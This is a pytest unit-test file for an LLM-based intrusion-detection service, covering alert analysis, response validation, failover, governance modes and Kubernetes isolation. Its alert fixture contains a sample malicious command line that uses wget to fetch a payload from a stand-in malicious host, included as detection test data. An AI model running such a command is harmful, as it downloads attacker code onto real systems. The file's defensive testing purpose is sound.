"""
LLM Engine Unit Tests
Tests for the multi-LLM failover architecture.

Run with: pytest tests/test_llm_engine.py -v
"""

import pytest
import json
from unittest.mock import Mock, patch, MagicMock
from datetime import datetime

# Import modules to test
import sys
sys.path.insert(0, 'services/ids-api/src')


# =============================================================================
# TEST FIXTURES
# =============================================================================

@pytest.fixture
def sample_alert():
    """Standard alert payload for testing"""
    return {
        "output": "Falco rule triggered: Unexpected process execution in container traffic-camera-001",
        "priority": "Critical",
        "rule": "Unexpected process",
        "time": "2025-01-15T10:30:00Z",
        "output_fields": {
            "container.name": "traffic-camera-001",
            "proc.cmdline": "/bin/bash -c wget http://malicious.site/payload",
            "user.name": "root"
        }
    }


@pytest.fixture
def valid_llm_response():
    """Valid LLM analysis response"""
    return {
        "summary": "Critical process execution detected in traffic camera container indicating possible compromise.",
        "severity": 8,
        "threat_type": "Unauthorized Access",
        "confidence": 0.85,
        "key_indicators": [
            "Unexpected bash execution",
            "Wget to external domain",
            "Root user execution"
        ],
        "mitigating_factors": [],
        "business_impact": "Traffic camera service may be compromised, risking surveillance data integrity.",
        "reasoning": "The wget command downloading from an external site combined with root execution suggests malware installation attempt.",
        "recommendations": [
            "Isolate the affected pod immediately",
            "Collect container logs for forensics",
            "Check for lateral movement"
        ],
        "automated_actions": ["isolate_pod", "collect_logs"]
    }


@pytest.fixture
def minimal_llm_response():
    """Minimal valid response with only required fields"""
    return {
        "summary": "Security event detected requiring investigation.",
        "severity": 5
    }


@pytest.fixture  
def malformed_llm_response():
    """Response with invalid/missing fields"""
    return {
        "summary": "",  # Too short
        "severity": 15,  # Out of range
        "threat_type": "NotARealThreat",  # Invalid enum
        "confidence": 2.5  # Out of range
    }


# =============================================================================
# RESPONSE SCHEMA TESTS
# =============================================================================

class TestLLMResponseSchema:
    """Tests for llm_response_schema.py"""
    
    def test_valid_response_validation(self, valid_llm_response):
        """Valid response should pass validation"""
        from llm_response_schema import validate_llm_response, LLMAnalysisResponse
        
        result = validate_llm_response(valid_llm_response)
        
        assert isinstance(result, LLMAnalysisResponse)
        assert result.severity == 8
        assert result.threat_type == "Unauthorized Access"
        assert result.confidence == 0.85
        assert "isolate_pod" in result.automated_actions
    
    def test_minimal_response_validation(self, minimal_llm_response):
        """Minimal response with defaults should validate"""
        from llm_response_schema import validate_llm_response
        
        result = validate_llm_response(minimal_llm_response)
        
        assert result.severity == 5
        assert result.threat_type == "Unknown"  # Default
        assert result.confidence == 0.5  # Default
        assert result.automated_actions == []  # Default
    
    def test_severity_clamping(self):
        """Severity should be clamped to 1-10 range"""
        from llm_response_schema import validate_llm_response
        
        # Test over 10
        result = validate_llm_response({
            "summary": "Test alert with severity over maximum.",
            "severity": 15
        })
        assert result.severity == 10
        
        # Test under 1
        result = validate_llm_response({
            "summary": "Test alert with severity under minimum.",
            "severity": -5
        })
        assert result.severity == 1
    
    def test_confidence_clamping(self):
        """Confidence should be clamped to 0.0-1.0"""
        from llm_response_schema import validate_llm_response
        
        result = validate_llm_response({
            "summary": "Test alert with confidence over maximum.",
            "severity": 5,
            "confidence": 2.5
        })
        assert result.confidence == 1.0
    
    def test_threat_type_normalization(self):
        """Threat types should be normalized to valid enums"""
        from llm_response_schema import validate_llm_response
        
        test_cases = [
            ("ddos", "DDoS"),
            ("denial of service", "DDoS"),
            ("priv esc", "Privilege Escalation"),
            ("data theft", "Data Exfiltration"),
            ("scanning", "Reconnaissance"),
            ("port scan", "Reconnaissance"),
            ("invalid_threat", "Unknown"),
        ]
        
        for input_type, expected in test_cases:
            result = validate_llm_response({
                "summary": f"Test with threat type: {input_type}",
                "severity": 5,
                "threat_type": input_type
            })
            assert result.threat_type == expected, f"Expected {expected} for input {input_type}"
    
    def test_fallback_response_creation(self):
        """Fallback response should be valid"""
        from llm_response_schema import create_fallback_response
        
        result = create_fallback_response(
            raw_content="Some LLM gibberish that couldn't parse",
            error_reason="JSON decode error"
        )
        
        assert isinstance(result, dict)
        assert result["severity"] == 5
        assert result["confidence"] == 0.3
        assert "alert_team" in result["automated_actions"]
        assert "manual" in result["recommendations"][0].lower()
    
    def test_response_metrics(self):
        """Response metrics should track properly"""
        from llm_response_schema import ResponseMetrics
        
        metrics = ResponseMetrics()
        metrics.record_valid()
        metrics.record_valid()
        metrics.record_fallback()
        metrics.record_error()
        
        assert metrics.total_responses == 4
        assert metrics.valid_responses == 2
        assert metrics.success_rate == 0.5


# =============================================================================
# JSON PARSING TESTS
# =============================================================================

class TestJSONParsing:
    """Tests for LLM JSON response parsing"""
    
    def test_parse_clean_json(self, valid_llm_response):
        """Clean JSON should parse correctly"""
        from llm_manager import parse_llm_response
        
        json_str = json.dumps(valid_llm_response)
        result = parse_llm_response(json_str)
        
        assert result is not None
        assert result["severity"] == 8
    
    def test_parse_markdown_fenced_json(self, valid_llm_response):
        """JSON in markdown code blocks should parse"""
        from llm_manager import parse_llm_response
        
        # With ```json fence
        fenced = f"Here's my analysis:\n```json\n{json.dumps(valid_llm_response, indent=2)}\n```\nHope this helps!"
        result = parse_llm_response(fenced)
        
        assert result is not None
        assert result["severity"] == 8
    
    def test_parse_with_text_around(self, valid_llm_response):
        """JSON with surrounding text should extract correctly"""
        from llm_manager import parse_llm_response
        
        with_text = f"Based on my analysis: {json.dumps(valid_llm_response)} This concludes my review."
        result = parse_llm_response(with_text)
        
        assert result is not None
    
    def test_parse_invalid_json_returns_none(self):
        """Invalid JSON should return None (not crash)"""
        from llm_manager import parse_llm_response
        
        invalid_inputs = [
            "This is not JSON at all",
            "{broken: json,",
            "{'single': 'quotes'}",  # Python dict syntax
            "",
            None
        ]
        
        for invalid in invalid_inputs:
            result = parse_llm_response(invalid)
            # Should return None or a fallback, not raise
            assert result is None or isinstance(result, dict)


# =============================================================================
# CIRCUIT BREAKER TESTS
# =============================================================================

class TestCircuitBreaker:
    """Tests for circuit breaker pattern"""
    
    def test_circuit_breaker_opens_after_failures(self):
        """Circuit should open after 5 consecutive failures"""
        from llm_manager import CircuitBreaker, CircuitState
        
        cb = CircuitBreaker(failure_threshold=5, recovery_timeout=30)
        
        assert cb.state == CircuitState.CLOSED
        
        # Record 5 failures
        for _ in range(5):
            cb.record_failure()
        
        assert cb.state == CircuitState.OPEN
        assert not cb.can_execute()
    
    def test_circuit_breaker_allows_after_success(self):
        """Circuit should close after success in HALF_OPEN"""
        from llm_manager import CircuitBreaker, CircuitState
        
        cb = CircuitBreaker(failure_threshold=2, recovery_timeout=0)  # 0 timeout for testing
        
        # Open the circuit
        cb.record_failure()
        cb.record_failure()
        assert cb.state == CircuitState.OPEN
        
        # Force to HALF_OPEN (normally happens after timeout)
        cb.state = CircuitState.HALF_OPEN
        
        # Record success
        cb.record_success()
        assert cb.state == CircuitState.CLOSED
    
    def test_circuit_breaker_resets_on_success(self):
        """Failure count should reset on success"""
        from llm_manager import CircuitBreaker
        
        cb = CircuitBreaker(failure_threshold=5)
        
        cb.record_failure()
        cb.record_failure()
        assert cb.failure_count == 2
        
        cb.record_success()
        assert cb.failure_count == 0


# =============================================================================
# LLM ENGINE MANAGER TESTS
# =============================================================================

class TestLLMEngineManager:
    """Tests for the main LLM orchestration"""
    
    @patch('llm_manager.httpx.Client')
    def test_failover_on_engine_failure(self, mock_client, sample_alert):
        """Should failover to next engine on failure"""
        from llm_manager import get_manager
        
        # This test verifies the failover logic exists
        # Full integration test would require mock API responses
        manager = get_manager()
        assert manager is not None
        assert len(manager.engines) > 0
    
    def test_manager_is_singleton(self):
        """Manager should be singleton"""
        from llm_manager import get_manager
        
        m1 = get_manager()
        m2 = get_manager()
        
        assert m1 is m2


# =============================================================================
# PROMPT BUILDING TESTS
# =============================================================================

class TestPromptBuilding:
    """Tests for prompt construction"""
    
    def test_build_analysis_prompt(self, sample_alert):
        """Prompt should include all alert fields"""
        from llm_manager import build_analysis_prompt
        
        prompt = build_analysis_prompt(sample_alert)
        
        assert "traffic-camera-001" in prompt
        assert "wget" in prompt
        assert "Critical" in prompt or "critical" in prompt
    
    def test_prompt_includes_json_schema(self, sample_alert):
        """Prompt should include expected JSON structure"""
        from llm_manager import build_analysis_prompt
        
        prompt = build_analysis_prompt(sample_alert)
        
        # Should include key fields
        assert "severity" in prompt.lower()
        assert "summary" in prompt.lower()
        assert "recommendations" in prompt.lower()


# =============================================================================
# GOVERNANCE TESTS
# =============================================================================

class TestGovernance:
    """Tests for human-in-the-loop governance"""
    
    def test_autopilot_mode_allows_all(self):
        """AUTOPILOT mode should auto-execute all actions"""
        from governance import GovernanceController, AutomationMode
        
        gc = GovernanceController()
        gc.set_mode(AutomationMode.AUTOPILOT)
        
        assert gc.should_auto_execute("isolate_pod", severity=10)
        assert gc.should_auto_execute("scale_up", severity=3)
    
    def test_manual_mode_blocks_all(self):
        """MANUAL mode should require approval for all"""
        from governance import GovernanceController, AutomationMode
        
        gc = GovernanceController()
        gc.set_mode(AutomationMode.MANUAL)
        
        assert not gc.should_auto_execute("isolate_pod", severity=10)
        assert not gc.should_auto_execute("scale_up", severity=3)
    
    def test_assisted_mode_severity_threshold(self):
        """ASSISTED mode should auto-execute low severity only"""
        from governance import GovernanceController, AutomationMode
        
        gc = GovernanceController()
        gc.set_mode(AutomationMode.ASSISTED)
        
        # Low severity should auto-execute
        assert gc.should_auto_execute("scale_up", severity=5)
        
        # High severity should require approval
        assert not gc.should_auto_execute("isolate_pod", severity=9)


# =============================================================================
# K8S AUTOMATION TESTS (Mocked)
# =============================================================================

class TestK8sAutomation:
    """Tests for Kubernetes automation (with mocked K8s client)"""
    
    @patch('k8s_automation.config.load_incluster_config')
    @patch('k8s_automation.client.CoreV1Api')
    def test_isolate_pod_creates_network_policy(self, mock_core_api, mock_config):
        """isolate_pod should create NetworkPolicy"""
        from k8s_automation import K8sAutomation
        
        # Create automation instance
        automation = K8sAutomation()
        
        # Verify it initializes (full test would mock more)
        assert automation is not None
    
    def test_dry_run_mode_no_changes(self):
        """Dry run mode should not make actual changes"""
        # This tests the concept - actual implementation would
        # verify no K8s API calls are made
        pass


# =============================================================================
# INTEGRATION TESTS
# =============================================================================

class TestIntegration:
    """End-to-end integration tests"""
    
    def test_full_alert_processing_flow(self, sample_alert, valid_llm_response):
        """Test complete alert → analysis → action flow"""
        # This would be a full integration test
        # For unit tests, we mock the LLM response
        pass


# =============================================================================
# PERFORMANCE TESTS
# =============================================================================

class TestPerformance:
    """Performance and reliability tests"""
    
    def test_response_cache_hit(self):
        """Cached responses should be returned quickly"""
        # Test that identical alerts use cache
        pass
    
    def test_rate_limiting(self):
        """Rate limiting should prevent API abuse"""
        # Test that rapid requests are throttled
        pass


# =============================================================================
# RUN TESTS
# =============================================================================

if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])
